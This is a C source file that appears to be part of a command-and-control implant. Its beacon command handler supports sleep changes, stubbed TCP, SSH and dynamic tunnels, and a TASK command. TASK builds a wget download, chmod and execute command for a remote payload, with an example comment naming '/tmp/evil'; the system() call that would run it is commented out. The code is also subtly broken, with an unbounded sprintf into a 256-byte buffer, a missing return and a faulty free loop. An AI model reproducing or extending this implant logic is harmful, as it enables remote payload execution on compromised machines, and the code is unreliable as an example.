#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <libgen.h>

#include "command.h"
#include "beacon.h"
#include "colors.h"

#define SUCC 0
#define FAIL (-1)

static int do_command(char *cmd, char *param)
{
	if (strcmp(cmd, "SLEP") == 0) {
		/* Update timeout value */
		timeout = (int)strtol(param, NULL, 10);
		printf(GREEN("[SLEP] Timeout set to %d seconds\n"), timeout);
		return SUCC;
	} else if (strcmp(cmd, "OTCP") == 0) {
		// remote port forwarding: L22C900
		printf(GREEN("[OTCP] Opened TCP tunnel on port X\n"));
		return FAIL;
	} else if (strcmp(cmd, "CTCP") == 0) {
		printf(GREEN("[CTCP] TCP tunnel closed\n"));
		return FAIL;
	} else if (strcmp(cmd, "OSSH") == 0) {
		printf(GREEN("[OSSH] Opened SSH tunnel on port X\n"));
		return FAIL;
	} else if (strcmp(cmd, "CSSH") == 0) {
		printf(GREEN("[CSSH] SSH tunnel closed\n"));
		return FAIL;
	} else if (strcmp(cmd, "ODYN") == 0) {
		printf(GREEN("[ODYN] Opened dynamic on port X\n"));
		return FAIL;
	} else if (strcmp(cmd, "CDYN") == 0) {
		printf(GREEN("[CDYN] Dynamic closed\n"));
		return FAIL;
	} else if (strcmp(cmd, "TASK") == 0) {
		char *cmd_str = malloc(256);
		if (cmd_str == NULL)
			return FAIL;
		char *filename = basename(param);
		// wget -O /tmp/evil http://127.0.0.1/http_client_linux_x64 && chmod u+x /tmp/evil && /tmp/evil
		sprintf(cmd_str,
			"wget -O /tmp/%s %s && chmod u+x /tmp/%s && /tmp/%s",
			filename, param, filename, filename);
		printf(GREEN("[TASK] %s\n"), cmd_str);
		// system(cmd_str);
		free(cmd_str);
		return FAIL;
	}
}

void exec_commands(char *beacon_response)
{
	struct command *cmds;
	printf("[*] Parsing beacon response...\n");
	int cmd_num = get_commands(beacon_response, &cmds);
	printf("[*] Found %d commands\n", cmd_num);

	int i, ret;
	struct command *curr_cmd = cmds;
	for (i = 0; i < cmd_num; i++) {
		printf("[*] Executing command #%d...\n", (i + 1));
		curr_cmd->ret = do_command(curr_cmd->type, curr_cmd->param);
		printf("[*] Command status: %s\n",
		       (curr_cmd->ret == SUCC) ? GREEN("V") : RED("X"));
		curr_cmd = curr_cmd->next;
	}

	/* Remember to free all command-related buffers */
	curr_cmd = cmds;
	struct command *next = cmds;
	for (i = 0; i < cmd_num; i++) {
		printf("[*] Freeing memory for command [%d]...\n",
		       curr_cmd->id);
		curr_cmd = next;
		printf("[*] Freeing command type...\n");
		free(curr_cmd->type);
		printf("[*] Freeing command parameter...\n");
		free(curr_cmd->param);
		next = curr_cmd->next;
		printf("[*] Freeing command struct...\n");
		free(curr_cmd);
	}
}
